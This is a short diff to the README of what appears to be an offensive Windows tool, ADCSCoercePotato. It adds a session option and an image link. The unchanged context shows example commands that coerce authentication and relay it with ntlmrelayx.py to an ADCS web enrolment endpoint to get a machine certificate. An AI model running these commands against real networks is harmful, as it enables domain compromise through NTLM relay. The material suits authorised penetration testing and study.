@@ -17,7 +17,7 @@ Optional args:
 -u Domain Username
 -p password
 -d Domain Name
-
+-s session (it seems not working, idk why)
 
 Example: ADCSCoercePotato.exe -m 192.168.212.22 -k 192.168.1.88 -u myuser -p mypass -d mydomain.domain
          On the Linux box (assuming it has IP:192.168.1.88 and the Windows attacker machine is:192.168.1.89)
@@ -26,3 +26,4 @@ Example: ADCSCoercePotato.exe -m 192.168.212.22 -k 192.168.1.88 -u myuser -p myp
          -> ntlmrelayx.py -t http://192.168.212.41/certsrv/certrqus.asp --adcs --template Machine -smb2support
 
 ```
+![изображение](https://github.com/MzHmO/ADCSCoercePotato/assets/92790655/26c44476-215e-4722-ae28-96a52ab5154e)
